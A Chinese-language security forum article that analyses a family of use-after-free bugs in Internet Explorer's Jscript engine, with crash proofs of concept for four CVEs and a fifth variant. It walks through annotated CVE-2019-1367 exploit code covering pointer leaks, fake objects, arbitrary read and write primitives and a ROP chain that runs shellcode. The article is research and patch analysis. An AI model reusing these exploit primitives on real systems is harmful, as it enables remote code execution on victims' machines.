> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-261581.htm)

目录

*            [异军突起的 Jscript 漏洞](#异军突起的jscript漏洞)
*                    [Jscript 组件简介](#jscript组件简介)
*                    [WPAD 攻击方式简介](#wpad攻击方式简介)
*            Case by case 介绍 4 个 Jscript 漏洞
*                    [CVE-2018-8653](#cve-2018-8653)
*                    [CVE-2019-1367](#cve-2019-1367)
*                    [CVE-2019-1429](#cve-2019-1429)
*                    [CVE-2020-0674](#cve-2020-0674)
*                    [一个 “新漏洞 “](#一个“新漏洞“)
*            [CVE-2019-1367 利用代码分析](#cve-2019-1367利用代码分析)
*                    [从 UAF 到越界读取](#从uaf到越界读取)
*                    [从越界读取到任意地址写](#从越界读取到任意地址写)
*                    [从任意地址写到任意地址读](#从任意地址写到任意地址读)
*                    [代码执行](#代码执行)
*            [谈谈此类漏洞产生的根源](#谈谈此类漏洞产生的根源)
*                    [标记清除算法介绍](#标记清除算法介绍)
*                    [Jscript 中 GC 机制的具体实现](#jscript中gc机制的具体实现)
*                            [Mark](#mark)
*                            [Scavenge](#scavenge)
*                            [Sweep](#sweep)
*            [一波三折的漏洞修复过程](#一波三折的漏洞修复过程)
*            [写在最后](#写在最后)
*            [参考链接](#参考链接)

异军突起的 Jscript 漏洞
----------------

### Jscript 组件简介

Jscript 组件是一个已被微软弃用的 JavaScript 引擎，主要在 IE8 以及更早的版本中使用。从 IE9 开始，微软用 Jscript9 替代了 Jscript，但依然保持对 Jscript 的解析接口。一种比较常见的 “召唤” 方式如下：

```



```

### WPAD 攻击方式简介

2017 年 12 月，Google Project Zero 的 Ivan Fratric 等人公开了一种新的 Windows 平台攻击方式。该方式借助 Jscript 漏洞和 WPAD/PAC 协议，实现了在 Win10 上通过单个 Jscript 漏洞实现远程代码执行和沙箱逃逸。这种方式显然引起了攻击者的注意，2018 年 12 月，谷歌捕获了第 1 个利用该方式进行实际攻击的漏洞，在随后的 1 年时间内，又连续出现 3 个相同类型的漏洞，一时间让原本已经无人问津的 Jscript 组件又重新引起大家的注意。

Case by case 介绍 4 个 Jscript 漏洞
------------------------------

在本小节中，笔者将结合每个漏洞的 PoC 简要介绍 4 个 Jscript 漏洞，通过 PoC 比对，读者将感受到这些漏洞的相似之处。

### CVE-2018-8653

首先跟随笔者看一下 CVE-2018-8653 的 PoC，如下：

```
var objs = new Array();
var refs = new Array();
var dummyObj = new Object();
 
function uaf() {
    // this未被GC追踪
    for (var i = 0; i < 10000; i++) {
        objs[i] = null;
    }
 
    CollectGarbage();
 
    for (var i = 0; i < 201; i++) {
        refs[i].prototype = null;
    }
 
    CollectGarbage();
    alert(this); // <- 触发crash
    return true;
}
 
for (var i = 0; i < 201; i++) {
    var arr = new Array({ prototype: {} });
    var e = new Enumerator(arr);
    refs[i] = e.item();
}
 
for (var i = 0; i < 201; i++) {
    refs[i].prototype = new RegExp();
    refs[i].prototype.isPrototypeOf = uaf;
}
 
for ( var i = 0; i < 10000; i++ ) {
    objs[i] = new Object();
}
 
dummyObj instanceof refs[200];

```

这个漏洞一个由 instanceof 回调导致的 UAF 漏洞，Jscript 代码没有将自定义的 instanceof 回调函数 (即 PoC 中的 uaf) 的 this 参数加入 GC 追踪列表，导致在回调函数中可以强制触发垃圾回收机制，得到悬垂指针，后面再次访问该指针时即发生 UAF。

### CVE-2019-1367

接着是 CVE-2019-1367 的 PoC，如下：

```
var spray = new Array();
 
function uaf() {
    // arguments未被GC追踪
    for(var i = 0; i < 20000; i++) {
        spray[i] = new Object();
    }
 
    arguments[0] = spray[5000];
 
    for(var i = 0; i < 20000; i++) {
        spray[i] = 0;
    }
 
    CollectGarbage();
    alert(arguments[0]); // <- 触发crash
    return 0;
}
 
[0, 0].sort(uaf);

```

这个漏洞是一个由 Array.sort 函数导致的 UAF 漏洞，Jscript 代码没有将 sort 函数中的 arguments 属性加入 GC 追踪列表，导致在回调函数中可以强制触发垃圾回收机制，得到悬垂指针，后面再次访问该指针时即发生 UAF。

### CVE-2019-1429

第 3 个漏洞是 CVE-2019-1429，这个漏洞对应的 PoC 如下：

```
var spray = new Array();
 
function uaf() {
    // arguments未被GC追踪
    for (var i = 0; i < 20000; i++) {
        spray[i] = new Object();
    }
 
    arguments[0] = spray[5000];
 
    for (var i = 0; i < 20000; i++) {
        spray[i] = 1;
    }
 
    CollectGarbage();
    alert(arguments[0]); // <- 触发crash
}
 
var o = {toJSON:uaf}
JSON.stringify(o);

```

这个漏洞是一个由 toJSON 函数导致的 UAF 漏洞，Jscript 代码没有将 toJSON 函数中的 arguments 属性加入 GC 追踪列表，导致在回调函数中可以强制触发垃圾回收机制，得到悬垂指针，后面再次访问该指针时即发生 UAF。

 

细心的读者肯定已经发现了，这和 CVE-2019-1367 不就是同一个漏洞吗？是的，它们就是同一个漏洞，但是微软就是没有补好。

### CVE-2020-0674

最后一个漏洞是 CVE-2020-0674，我们来看一下这个漏洞的 PoC：

```
var depth = 0;
var spray_size = 10000;
var spray = new Array();
var sort = new Array();
var total = new Array();
 
for(i = 0; i < 110; i++) sort[i] = [0, 0];
for(i = 0; i < spray_size; i++) spray[i] = new Object();
 
function uaf(arg1, arg2) {
    // arg1, arg2等传入的参数未被GC追踪
    arg1 = spray[depth * 2];
    arg2 = spray[depth * 2 + 1];
    if(depth > 50) {
        spray = new Array();
        CollectGarbage();
        total.push(arg1);
        total.push(arg2);
        return 0;
    }
    depth += 1;
    sort[depth].sort(uaf);
    return 0;
}
 
sort[depth].sort(uaf);
 
for(i = 0; i < total.length; i++) {
    typeof total[i]; // <- 触发crash
}

```

这个漏洞和 CVE-2019-1367 又非常像，又一个由 Array.sort 函数导致的 UAF 漏洞，所不同的是这次的问题不是出在 arguments 属性，而是出在传入的参数中。Jscript 代码没有将 sort 函数中的调用参数加入 GC 追踪列表，导致在回调函数中可以强制触发垃圾回收机制，得到悬垂指针，后面再次访问该指针时即发生 UAF。

### [](#一个“新漏洞“)一个 “新漏洞 “

相信许多读者和笔者一样，看上面几个案例后，会下意识地找一下通过 Json 序列化操作触发 CVE-2020-0674 的路径，并构造出第 5 个 PoC：

```
var depth = 0;
var spray_size = 10000;
var spray = new Array();
var arr = new Array();
var total = new Array();
 
for(i = 0; i < 110; i++) arr[i] = [0, 0];
for(i = 0; i < spray_size; i++) spray[i] = new Object();
 
function uaf(arg1, arg2) {
    // arg1, arg2等传入的参数未被GC追踪
    arg1 = spray[depth * 2];
    arg2 = spray[depth * 2 + 1];
    if(depth > 50) {
        spray = new Array();
        CollectGarbage();
        total.push(arg1);
        total.push(arg2);
        return 0;
    }
    depth += 1;
    JSON.stringify(arr[depth], uaf);
    return 0;
}
 
JSON.stringify(arr[depth], uaf);
 
for(i = 0; i < total.length; i++) {
    typeof total[i]; // <- 触发crash
}

```

事实上，这个 PoC 确实可以导致 Crash，是 CVE-2020-0674 的兄弟漏洞，但是在 CVE-2020-0674 的补丁出来后，此类 UAF 已经无法触发。

 

读者看完上述 5 个 PoC 后，是不是感觉微软在修补此类漏洞时显得很不专业？微软应该在一开始就将此类漏洞从根本上修复，这样就不会有这么多补丁绕过漏洞。事实上，Ivan Fratric 在上述几个漏洞出现之前就发出过相关警告，并且在漏洞出现后也发表过感慨，喜欢考古的读者可以看一下文末参考链接 “补丁分析” 部分的两个推特链接。

CVE-2019-1367 利用代码分析
--------------------

在本小节中，笔者将分享 CVE-2019-1367 利用代码的一些细节，之所以选择 CVE-2019-1367，一方面是因为国外已经有研究员写过[相关分析](https://blog.confiant.com/internet-explorer-cve-2019-1367-exploitation-part-2-8143242b5780)，但文章过长，且文内代码经过混淆，不易阅读，笔者结合手上资料对相关代码进行了解混淆，以便于阅读；另一方面是因为 4 个漏洞的利用代码大同小异，举一例即可。

 

以下只分析 32 位下的利用代码，为保持一致，代码中出现的注释复用国外分析文章中的注释。随笔者一起来看一下如何只用单个 UAF 漏洞即实现远程代码执行。

 

首先回顾下 32 位下 variant 在内存中的数据结构：

```
// total size 0x10 bytes
struct VAR {
    QWORD type;    // 8 bytes
    void* obj_ptr; // 4 bytes
    VAR next_var;  // 4 bytes
}

```

### 从 UAF 到越界读取

利用代码首先在内存中布局一定数量的 RegExp 对象 (作为参数的 reSrc 大有玄机，后面会再次提及)：

```
var refsLimit = 2 * 100 - 1;
for(var i = 0; i < refsLimit; i++)
    rrefs[i] = new RegExp(reSrc); // <--- spray with pattern text "reSrc"

```

随后借助 UAF 漏洞，用经典的 Jscript UAF 占位手法 (详情可参考笔者对 CVE-2018-8353 的分析文章)，将一个原本表示 RegExp 对象的 variant 的 type 域从 0x81(对象) 修改为 0x03(number)，从而将一个 RegExp 对象指针以整数形式泄露出来：

```
function makeVariant(vt, dword1, dword2){
    var charCodes = new Array();
    charCodes.push(vt, 0x00, 0x00, 0x00, dword1 & 0xFFFF, (dword1 >> 16) & 0xFFFF, dword2 & 0xFFFF, (dword2 >> 16) & 0xFFFF);
    return String.fromCharCode.apply(null , charCodes);
}
 
var reallocPropertyName = "\u0000\u0000";
while(reallocPropertyName.length < 0x17a)
    reallocPropertyName += makeVariant(0x0082);
 
reallocPropertyName += "\u0003";
 
// ... code skipped ...
 
dummyArrs[0].sort(FreeingComparator);
var srcs = new Array();
 
for(var i = 0; i < refsLimit; i++)
    try{
        throw erefs[i];
    }catch(e){
        srcs[i] = e.source;
    }
 
var leakIndex = -1;
for(var i = 0; i < refsLimit; i++)
    try{
        if((typeof nrefs[i]) === "number"){
            leakIndex = i;
            break;
        }
    }catch(e){}
 
if(leakIndex == -1)
    throw new Error("Could not find RegExp address.");
else{}

```

得到 RegExp 对象指针后，借助 makeVariant 函数将 RegExpObj+4 的地方封装为一个字符串 variant(type=0x82) 的指针部分，并再次借助漏洞将其布局到内存：

```
var leakRegExpObj = nrefs[leakIndex] & 0xFFFFFFFF;
var extendPropertyName = "\uFFFF\uFFFF\uFFFF\uFFFF\uFFFF\uFFFF" + makeVariant(0x0082, leakRegExpObj + 4); // string 4 bytes ahead, leakRegExpObj is previous fake VAR of type number (0x3)
 
for(var i = refsLimit; i >= leakIndex; i--)
    nrefs[i] = null;
 
for(var i = 0; i < 0x1000; i++)
    propHolders[i][extendPropertyName] = 1; // store the property name
 
while(--leakIndex >= 0)
    try{
        if((typeof nrefs[leakIndex]) === "string" && nrefs[leakIndex].length > 0x1000)
            break;
        else
            nrefs[leakIndex] = null;
    }
    catch(e){}
 
if(leakIndex == -1)
    throw new Error("Could not find RegExp leak string.");
else{}

```

搜索到对应的字符串 variant 后，此时的 variant.obj_ptr 指向一个伪造的 BSTR 对象的字符串部分，这个 BSTR 对象的 length 部分为 RegExpObj 的虚表，是一个非常大的值；str 部分为 RegExpObj+0x04。到这里已经具备了越界读取能力，随后借助这一越界读取能力读取整个 RegExpObj 的内容并保存到 fakeRegExpCharCodes 数组，并在数组的最后为 shellcode 预留了位置 (0xCCCC)：

```
var bstrVal = 8;
var sizeof_RegExpObj = 0xC0;
var m_pvarMaster = 0x10;
var m_varCode = 0x38;
var m_varSrc = 0x48;
 
// ... code skipped ...
 
// here nrefs[leakIndex].length value is faulty and points to a large number
// nrefs[leakIndex].charCodeAt(i) can be used to read arbitrary bytes.
var fakeRegExpCharCodes = new Array();
fakeRegExpCharCodes.push((nrefs[leakIndex].length * 2) & 0xFFFF);
fakeRegExpCharCodes.push(((nrefs[leakIndex].length * 2) >> 16) & 0xFFFF);
 
for(var i = 0; i < sizeof_RegExpObj / sizeof_WCHAR; i++)
    fakeRegExpCharCodes.push(nrefs[leakIndex].charCodeAt(i));
 
fakeRegExpCharCodes[m_pvarMaster / sizeof_WCHAR] = 0;
fakeRegExpCharCodes[(m_pvarMaster / sizeof_WCHAR) + 1] = 0;
 
for(var i = 0; i < sizeof_VAR / sizeof_WCHAR; i++){
    fakeRegExpCharCodes[m_varCode / sizeof_WCHAR + i] = fakeRegExpCharCodes[m_varSrc / sizeof_WCHAR + i];
    fakeRegExpCharCodes[m_varSrc / sizeof_WCHAR + i] = 0;
}
 
for(var i = 0; i < shellcode.length; i++)
    fakeRegExpCharCodes.push(0xCCCC);
 
var fakeRegExpStr = String.fromCharCode.apply(null, fakeRegExpCharCodes);

```

### 从越界读取到任意地址写

前面已经从内存中 “dump” 出一个完整的 RegExpObj(一共 dump 了 sizeof_RegExpObj+4 字节)，接下来是整个利用过程的精彩部分，跟随笔者一起来看一下利用代码如何借助正则表达式对象构造一个完美的任意地址写入原语。

 

要理解这一过程，首先需要了解下 RegExpObj 的一些成员，RegExpObj 在 32 位下的大小为 0xC0，其中比较重要的几个成员如下：

*   RegExpObj+0x10: 这里保存着一个地址，该地址指向一个 type=0x81 的 variant，此 variant 指向当前 RegExpObj
*   RegExpObj+0x38：这里保存着一个 type=0x80(间接引用) 的 variant，该 variant.obj_ptr 进一步指向一个 type=0x08(字符串) 的 variant，该 variant.obj_ptr 指向一个 RegExpExec 对象首部，RegExpExec 对象首部是一个 0x4b74614e 魔术值，接着是一个头部，然后是一个与正则 pattern 相对应的字符串
*   RegExpObj+0x48: 这里保存着一个 type=0x08(字符串) 的 variant，该 variant.obj_ptr 指向一个 BSTR 对象，此 BSTR 对象保存着与正则文本域相对应的字符串。但需要注意的是，这个地方的的 variant 只有在调用 RegExp.source() 后才会得到初始化

如上面代码所示，利用借助 fakeRegExpCharCodes 数组修改了上述 RegExpObj+0x10 和 RegExpObj+0x38 处的变量，首先将 RegExpObj+0x10 开始的 4 字节置为空，然后将 RegExpObj+0x48 处的 0x10 字节拷贝到 RegExpObj+0x38 处，即替换了对应的 variant。为什么要这么做？这就涉及到本小节最前面的那句 new RegExp(reSrc)。原来，攻击者传给 RegExp 的 reSrc 参数是一个精心设计的 RegExpExec，经过上面的替换后 RegExpObj+0x38 处的 RegExpExec 已经变成一个伪造的 RegExpExec，后面正是借助这个伪造的 RegExpExec 实现任意地址写。

 

修改完 fakeRegExpCharCodes 后，将其转化为一个 fakeRegExpStr 字符串对象，然后循环调用 RegExp.compile 方法将其更新到内存，并调用 RegExp.source 将 fakeRegExpStr 的地址更新到 RegExpObj+0x48 处的 variant.obj_ptr，随后读取 RegExpObj+0x48 处的内存，得到 fakeRegExpStr 的地址。

 

得到 fakeRegExpStr 的地址后，再次借助 makeVariant 将其封装为一个 type=0x81 的 variant，并第 3 次触发漏洞将 variant 布局到被释放的内存。随后在内存定位到对应的 variant，得到一个 RegExpObj，取出 RegExpObj+0x48 处的 variant。如前所述，这个 variant 是 type=0x80，是一个间接引用，需要读取 variant.obj_ptr 作为新的 variant，再读取一次 variant.obj_ptr

```
// obj_ptr points to the VAR.obj_ptr corresponding to the VAR in RegExpObj+0x48
var obj_ptr = (nrefs[leakIndex].charCodeAt(((m_varSrc - 4 + bstrVal) / sizeof_WCHAR) + 1) << 16) | (nrefs[leakIndex].charCodeAt((m_varSrc - 4 + bstrVal) / sizeof_WCHAR) + 2); // 注意这边这个+2很有意思
 
// The memory at obj_ptr is read, by creating fake VARs pointing to the addres in obj_ptr (VAR.obj_ptr)
var extendPropertyName2 = "\uFFFF\uFFFF\uFFFF\uFFFF\uFFFF\uFFFF" + makeVariant(0x0082, obj_ptr);
for(var i = refsLimit; i >= leakIndex; i--)
    nrefs[i] = null;
 
for(var i = 0; i < 0x1000; i++)
    propHolders[i][extendPropertyName2] = 1;
 
while(--leakIndex >= 0)
    try{
        if((typeof nrefs[leakIndex]) === "string" && nrefs[leakIndex].length > 0x1000) // m_varSrc处是一个type=0x80的variant指针，解引用后是一个type=8的字符串VAR
            break;
        else
            nrefs[leakIndex] = null;
    }catch(e){}
 
if(leakIndex == -1)
    throw new Error("Could not find GcBlock leak string.");
else{}
 
var fakeRegExpAddr = -1;
 
/*
Reading the content of this VAR.Obj_ptr, this VAR corresponding to a String VAR.
 
0:000> dc 076cf6f8-10
076cf6e8  076c0008 054ebd08 061ebcec 6c011380  ..l...N........l
076cf6f8  00000008 00000000 [061ebb24] 076cf728  ........$...(.l. <- 内存对齐时的variant
076cf708  00000008 00000000 061e8114 076cf6a8  ..............l.
076cf718  00000008 00000000 061eb95c 40300000  ........\.....0@
076cf728  02bb0081 00000002 0770c9f0 076cf748  ..........p.H.l.
076cf738  00000009 00000000 0770a158 00000000  ........X.p.....
076cf748  076c0008 054ebd08 061eb794 6c011380  ..l...N........l
076cf758  00000008 00000000 061eb5cc 076cf788  ..............l.
 
0:000> dc 076cf6f8+2-4
076cf6f6  00086c01 00000000 [bb24]0000 f728[061e]  .l........$...(. <- 借助前面的数据伪造length后的内存，所以为 charCodeAt(4) << 16) | charCodeAt(3)，长度被解释为，0x86c01，符合校验条件
076cf706  0008076c 00000000 81140000 f6a8061e  l...............
076cf716  0008076c 00000000 b95c0000 0000061e  l.........\.....
076cf726  00814030 000202bb c9f00000 f7480770  0@..........p.H.
076cf736  0009076c 00000000 a1580000 00000770  l.........X.p...
076cf746  00080000 bd08076c b794054e 1380061e  ....l...N.......
076cf756  00086c01 00000000 b5cc0000 f788061e  .l..............
076cf766  0008076c 00000000 7d6c0000 f708061e  l.........l}....
 
// fake RegExpObj
0:000> dc 061ebb24
061ebb24  6bfe2b3c 00000001 078b7af0 02bc3588  <+.k.....z...5..
061ebb34  00000000 ffffffff 076caf40 00080000  ........@.l.....
061ebb44  00000000 6bfe78a8 02bbe920 0770c93c  .....x.k ...<.p.
061ebb54  0770caf4 6c071bb8 00000080 00000000  ..p....l........
061ebb64  076cc338 00000000 00000000 00000000  8.l.............
061ebb74  00000000 00000000 00000000 00000000  ................
061ebb84  00000000 00000000 00000000 00000000  ................
061ebb94  00000000 00000000 00000000 00000000  ................
 
0:000> ln 6bfe2b3c
(6bfe2b3c)   jscript!RegExpObj::`vftable'   |  (6bfe2c38)   jscript!NameList::`vftable'
Exact matches:
*/
if(nrefs[leakIndex].charCodeAt)
    fakeRegExpAddr = (nrefs[leakIndex].charCodeAt(4) << 16) | nrefs[leakIndex].charCodeAt(3); // 读取fakeRegExp字符串首地址
 
if(fakeRegExpAddr == -1)
    throw new Error("Failed to leak fake RegExp address.");

```

获得 fakeRegExpAddr 后，再次借助 makeVariant，将 fakeRegExpAddr 封装到一个 type=0x81 的 variant，随后第 4 次借助漏洞进行布局，在内存中搜索得到伪造的 RegExp 对象，到这里就获得了一个精心伪造的 RegExp 对象，借助 RegExp.test() 函数测试是否伪造正确：

```
var extendPropertyName3 = "\uFFFF\uFFFF\uFFFF\uFFFF\uFFFF\uFFFF" + makeVariant(0x0081, fakeRegExpAddr); // regexp type
 
for(var i = refsLimit; i >= leakIndex; i--)
    nrefs[i] = null;
 
for(var i = 0; i < 0x1000; i++)
    propHolders[i][extendPropertyName3] = 1;
 
while(--leakIndex >= 0)
    try{
        if((typeof nrefs[leakIndex]) === "object")
            break;
        else
            nrefs[leakIndex] = null;
    }catch(e){}
 
if(leakIndex == -1)
    throw new Error("Could not find fake RegExp.");
else{}
 
var fakeRegExp = nrefs[leakIndex];
var reTestResult = fakeRegExp.test("t"); // RegExp.test()
 
if(!reTestResult)
    throw new Error("Fake RegExp did not respond correctly to test execution, creation may have failed.");

```

借助上述伪造的 RegExp 对象就可以实现任意地址写：

```
function write(where, what) {
    try {
        var byteCodeStack = String.fromCharCode.apply(null, [0x0077, 0x0110, 0x0000, 0x0000, 0x0000, ((what & 0xFF) << 8) | 0x03, (what & 0xFFFF00) >> 8, ((where & 0xFF) << 8) | (((what & 0xFF000000) >> 24) & 0xFF), (where & 0xFFFF00) >> 8, (0x07 << 8) | (((where & 0xFF000000) >> 24) & 0xFF)]);
        fakeRegExp.test(byteCodeStack);
    } catch(e) {}
    return byteCodeStack;
}

```

这个 write 函数是整个利用中最精彩的部分，这个原语的构造细节涉及到 Jscript 正则引擎的虚拟机知识，利用的编写者肯定对 Jscript 模块的正则表达引擎非常熟悉。由于笔者并不擅长这块，这部分等待有能力的读者进行补充分析。

### 从任意地址写到任意地址读

有了任意地址写原语后，配合 RegExpObj+0x48 处的 variant，就可以通过修改 type 和 obj_ptr 的方式实现任意地址读取，由于 BSTR 对象的 length 在读取时会除以 2，所以具体的读取函数会借助移位来避免数据失真。

```
function readBYTE(where){
    write(fakeRegExpAddr + m_varSrc, 0x82);
    write(fakeRegExpAddr + m_varSrc + bstrVal, where + sizeof_DWORD - 1);
    return (fakeRegExp.source.length >> 7) & 0xFF;
}
 
function readWORD(where){
    return ((readBYTE(where + 1) << 8) | readBYTE(where));
}
 
function readDWORD(where){
    return ((readBYTE(where + 3) << 24) | (readBYTE(where + 2) << 16) | (readBYTE(where + 1) << 8) | readBYTE(where));
}

```

### 代码执行

构造出任意地址读写原语后，利用代码首先借助这两个原语封装了一系列功能函数，然后借助 write 函数的返回值泄露了 一个 native 栈上的地址，并在该基础上得到一个栈上的返回地址，用搜索得到的 ROP gadget 覆盖之，在函数返回时，控制流被劫持，绕过 CFG 并运行 shellcode：

```
write(newEbp + 4, popEcxRet + 1);                                            // rop gadget: ret
write(newEbp + 4 + 4 + 0x18, popEcxRet);                                     // rop gadget: pop eax; ret
write(newEbp + 4 + 4 + 0x1C, popEcxRet + 1);                                 // rop gadget: ret
write(newEbp + 4 + 4 + 0x20, popEbpRet);                                     // virtual Protect Address
write(newEbp + 4 + 4 + 4 + 0x20, fakeRegExpAddr + sizeof_RegExpObj);         // virtual protect return address (shellcode address)
write(newEbp + 4 + 4 + 4 + 4 + 0x20, fakeRegExpAddr + sizeof_RegExpObj);     // lpAddress (shellcode address)
write(newEbp + 4 + 4 + 4 + 4 + 4 + 0x20, (shellcode.length * sizeof_WCHAR)); // dwSize (shellcode size)
write(newEbp + 4 + 4 + 4 + 4 + 4 + 4 + 0x20, 0x40);                          // PAGE_EXECUTE_READWRITE
write(newEbp + 4 + 4 + 4 + 4 + 4 + 4 + 4 + 0x20, newEbp - 0x1000);           // oldprotect
write(regExpExecAddress, newEbp);                                            // <-- overwrites return address in the native stack

```

关于该利用的更多细节可以参考这篇文章：

```
https://blog.confiant.com/internet-explorer-cve-2019-1367-exploitation-part-2-8143242b5780

```

谈谈此类漏洞产生的根源
-----------

### 标记清除算法介绍

在本小节中，笔者来讨论下这类漏洞形成的具体原因，读者首先需要了解下垃圾回收算法里面的标记 - 清除算法 (Mark Sweep GC)。这个算法在《垃圾回收的算法与实现》一书的算法篇第 2 章中有清晰的描述，几个关键概念如下：

1.  根 (Root)：最上层对象，通过根可以遍历得到其他活动对象
2.  对象 (Obj)： 可以通过根遍历到，头部有一个标志位指示其是否被 Mark
3.  标记 (Mark)：扫描所有对象 (被使用的和未被使用的)，对对象头部的标志位进行标记，例如置为 1
4.  捡拾 (Scavenge)：从所有根对象开始遍历，对所有遍历到的对象头部的标志位进行重置，例如置为 0，将对象标志为不可清除
5.  清除 (Sweep)：再次扫描所有对象 (被使用的和未被使用的)，对标志位为 1 的对象进行回收 (可以直接释放内存；也可以先简单将对象类型进行抹除，等到被抹除类型的对象达到某一阈值后再集中进行释放，Jscript 采用的是后一种)

上述这类 Jscript 漏洞的根源在于：在进入特定的回调函数 / 调用函数的过程中，开发者忘记将个别对象属性或者栈上的 variant 变量加入相应的 Root/Scavenge(回收) 列表进行追踪。导致在回调函数中可以获得对问题 variant 的引用，手动调用 CollectGarbage 触发 GC，使 variant 被回收，最终获得悬垂指针，造成 UAF。

 

Jscript 的开发工程师曾经写过一篇关于 Jscript 垃圾回收机制的设计性描述，有兴趣的读者可以参考：

```
https://docs.microsoft.com/zh-cn/archive/blogs/ericlippert/how-do-the-script-garbage-collectors-work

```

### Jscript 中 GC 机制的具体实现

关于 Jscript 中 GC 机制的具体实现，国外研究员 Sudhakar Verma 写过一篇很棒的分析，为方便读者理解，笔者在这里对其进行注释说明，读者也可以在文末参考链接 “Jscript 的垃圾回收机制” 一节中找到这篇文章并阅读。

 

Jscript 中的 variant 存在一个个 GCBlock 结构中，每个 GCBlock 结构如下：

```
struct GcBlock{
    struct GcBlock * prev;
    struct GcBlock * next;
    VARIANT mem[100];
};

```

当定义变量时，Jscript 引擎内部会申请一些 GCBlock，并初始化其内部的 variant 结构。

 

申请第一个 GCBlock 的相关调用如下：

```
GcBlockFactory::GcBlockFactory
 
GcContext::EnsureGc
    GcContext::New
        GcContext::GcContext
        GcContext::Init

```

当有需要时，更多 GCBlock 被申请，申请过程如下：

```
GcAlloc::PvarAlloc
    GcBlockFactory::PblkAlloc // Jscript中有一个全局变量，这个变量是一个大小为50的GCBlock缓存链表的头部，当申请一个GCBlock时，优先从该链表申请
    GcBlock::Link

```

申请到的每一个 GCBlock 都会链接到一个双向链表 (区别于缓存链表的另一个链表)，遍历链表可以访问到所有 GCBlock 中的所有 variant。

 

当在 Jscript 代码中手动调用 CollectGarbge 函数时，Jscript 引擎会调用 JsCollectGarbage 函数，JsCollectGarbage 进一步会调用 GcContext::Collect 函数，紧随 Mark、Scavenge、和 Sweep 三个过程。

*   #### Mark
    

Mark 阶段会遍历 GCBlock 链表，并遍历每个 GCBlock 中的所有 variant，对所有 variant 的第 12 位 (定义第 1 位为最低位) 置位 1(|= 0x800)，这个过程涉及的调用如下：

```
GcContext::SetMark
    GcAlloc::SetMark

```

*   #### Scavenge
    

Mark 完毕后是 Scavenge 阶段，这个阶段的任务是捡拾，即把所有还在使用中的对象从 Mark 阶段 “抢救” 回来，方法是从每一种不同的 Root 开始遍历，得到所有可遍历到的 Jscript 对象和 variant，并将所有遍历到的 variant 的第 12 位置为 0(&=0xf7ff)，相关函数的调用顺序如下：

```
ObjectRegistration::ScavengeRoots
    FncObj::ScavengeCore
        GcContext::ScavengeVar
 
VarStack::ScavengeRoots
 
ObjectRegistration::ScavengeRoots
    ScrFncObj::ScavengeCore
 
ObjectRegistration::ScavengeRoots
    VAR::Scavenge
        GcContext::ScavengeVar
    NameTbl::ScavengeCore
        NameList::ScavengeRoots
 
ScavVarList::ScavengeRoots
    GcContext::ScavengeVar
 
GCRootStack::ScavengeRoots

```

*   #### Sweep
    

最后是清理阶段，这个阶段会再次遍历 GCBlock 链表，并遍历每个 GCBlock 中的所有 variant，对所有第 12 位为 1 的 variant 进行对应的清理。当一个 GCBlock 内的所有 variant 都被清理时，这个 GCBlock 并不会被立即释放，只会对一个全局计数加 1，并将这个 GCBlock 加入上述缓存链表。当全局计数大于等于 50 时，Jscript 会将多余的 GCBlock 摘链后直接进行 delete。相关过程如下所示：

```
                        GcContext::Reclaim(0x4f96030, 0x2)
                                GcAlloc::ReclaimGarbage(0x4f9c580)
                                // 作者举了一个64位下的例子进行说明，此时variant的第12位为1(0x808)
                                00000000`04f9ce20  00000000`00000808 00000000`01ab9ff8
                                00000000`04f9ce30  00000000`00000000
 
                                        VariantClear(0x4f9ce20)
                                        // 到这里Flag已经被清除，即将清理相应的variant
                                        00000000`04f9ce20  00000000`00000008 00000000`01ab9ff8
                                        00000000`04f9ce30  00000000`00000000
 
                                        VariantClear+6b returns 0x0
                                        GcContext::Adapt(0x4f96030, 0x1, 0x11)
                                        GcContext::Adapt+77 returns 0x6
                                GcAlloc::ReclaimGarbage+24a returns 0x6
                                GcContext::NormalizeBuckets(0x4f96030)
                                GcContext::NormalizeBuckets+4c returns 0x24b978
                        GcContext::Reclaim+128 returns 0x1
                GcContext::CollectCore+1bb returns 0x1
        GcContext::Collect+43 returns 0x1
JsCollectGarbage+29 returns 0x0

```

现在，读者应该可以比较清晰地了解 Jscript 中的垃圾回收机制。

一波三折的漏洞修复过程
-----------

提及微软对此类漏洞的修复，比较早的一个修复方案要追溯到 CVE-2018-8353，这个漏洞是 Ivan Fratric 发现的，成因和本文中讨论的几个漏洞完全一致，微软当时的修复方案是将造成 lastIndex 加入 Scavenge(捡拾) 列表，大致如下：

```
VAR::Scavenge(RegExpObj.lastIndex, GcContextObj)

```

很明显，这是一种创可贴式的修补，它解决了当前问题，但没有解决此类问题。随后的 CVE-2018-8653，CVE-2019-1367，CVE-2019-1429 都是创可贴式的修补，直到 CVE-2020-0674 的修补方案出现。在 CVE-2020-0674 的补丁中，微软在 Jscript 中加入了一个新的函数 ScrFncObj::PerformCall，之前对 CallWithFrameOnStack 和 CallWithFrameOnHeap 的调用都改为间接调用 ScrFncObj::PerformCall 进入，在 ScrFncObj::PerformCall 中，会将函数参数都加入到 root 列表中，这样就从根本上杜绝了 CVE-2020-0674 这类漏洞的产生。笔者在进行补丁分析的过程中，查到启明星辰的一篇文章，这篇文章对 CVE-2020-0674 补丁进行了比较细致的分析，文末参考链接 “补丁分析” 处给出了文章的网址，读者可以进行参考。

 

有意思的是，在 CVE-2019-1367 的补丁中，微软在 Jscript 引入了一个 GcContext::IsLegacyGCEnabled() 函数。如伪码所示，这个函数用来检查是否开启旧的 GC 机制，方法是检查 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Policies 项下一个 REG_DWORD 类型的键：ee1ca8aa-4402-4da1-bbe2-69a09c483a56 的值是否为 1，若为 1，则不对导致漏洞的对象进行 GC 追踪。

```
int __stdcall GcContext::InitIsLegacyGCEnabled(union _RTL_RUN_ONCE *a1, void *a2, void **a3)
{
    DWORD cbData;
    HKEY phkResult;
    DWORD Type;
    BYTE Data[4];
 
    *(_DWORD *)Data = 0;
    cbData = 4;
    Type = 0;
    GcContext::s_fIsLegacyGCEnabled = 0;
    if ( !RegOpenKeyExA(HKEY_LOCAL_MACHINE, "System\\CurrentControlSet\\Policies", 0, 0x20119u, &phkResult) )
    {
        if ( !RegQueryValueExA(phkResult, "6310d37c-a685-4133-81b7-01b42749b9b4", 0, &Type, Data, &cbData)
            && *(_DWORD *)Data == 1
            && Type == REG_DWORD ) {
            GcContext::s_fIsLegacyGCEnabled = 1;
        }
        RegCloseKey(phkResult);
    }
    return 1;
}

```

